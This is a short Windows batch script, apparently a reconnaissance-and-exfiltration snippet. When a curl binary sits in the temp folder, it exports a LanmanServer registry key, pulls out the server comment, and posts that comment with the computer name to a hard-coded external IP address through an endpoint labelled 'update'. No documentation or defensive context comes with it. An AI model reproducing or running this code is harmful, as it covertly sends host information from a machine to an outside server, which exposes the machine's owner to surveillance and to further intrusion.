:main
	IF NOT exist %temp%\curl.exe GOTO end
	
	set comment=None
	reg export HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\ reg.txt /y
	for /f "skip=2 tokens=2 delims==" %%a in ('find "srvcomment" reg.txt') do set comment=%%~a
	%temp%\curl -F servername=%computername% -F appname=%comment% http://3.156.183.140:8000/app/update/
	
:end